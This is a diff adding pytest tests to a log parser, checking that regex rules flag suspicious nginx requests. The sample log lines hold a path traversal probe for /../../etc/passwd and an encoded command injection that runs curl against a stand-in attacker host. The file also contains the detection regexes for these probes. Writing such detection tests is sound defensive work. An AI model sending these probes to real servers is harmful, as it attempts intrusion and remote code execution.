@@ -8,6 +8,7 @@ from traxerax_lite.parser import (
     parse_mail_line,
     parse_nginx_access_line,
 )
+import re
 
 
 def test_parse_failed_login() -> None:
@@ -98,6 +99,46 @@ def test_parse_nginx_suspicious_request() -> None:
     assert event is not None
     assert event.event_type == "nginx_suspicious_request"
     assert event.path == "/wp-login.php"
+
+
+def test_parse_nginx_regex_suspicious_request() -> None:
+    """Regex patterns should flag traversal-style nginx requests."""
+    line = (
+        '185.10.10.1 - - [25/Mar/2026:10:00:04 +0000] '
+        '"GET /../../etc/passwd HTTP/1.1" 404 153 "-" "Mozilla/5.0"'
+    )
+
+    event = parse_nginx_access_line(
+        line,
+        suspicious_paths=set(),
+        suspicious_path_patterns=[
+            re.compile(r'(?:^|/)\.\.(?:/|%2f|%252f|\\)', re.IGNORECASE)
+        ],
+    )
+
+    assert event is not None
+    assert event.event_type == "nginx_suspicious_request"
+    assert event.path == "/../../etc/passwd"
+
+
+def test_parse_nginx_regex_matches_encoded_command_probe() -> None:
+    """Regex patterns should inspect encoded request targets too."""
+    line = (
+        '185.10.10.1 - - [25/Mar/2026:10:00:04 +0000] '
+        '"GET /search?q=%24%28curl%20http://evil.example/p.sh%29 HTTP/1.1" '
+        '404 153 "-" "Mozilla/5.0"'
+    )
+
+    event = parse_nginx_access_line(
+        line,
+        suspicious_paths=set(),
+        suspicious_path_patterns=[
+            re.compile(r'(?:;|\||`|\$\(|\${)', re.IGNORECASE)
+        ],
+    )
+
+    assert event is not None
+    assert event.event_type == "nginx_suspicious_request"
 
 
 def test_parse_dovecot_failed_login() -> None:
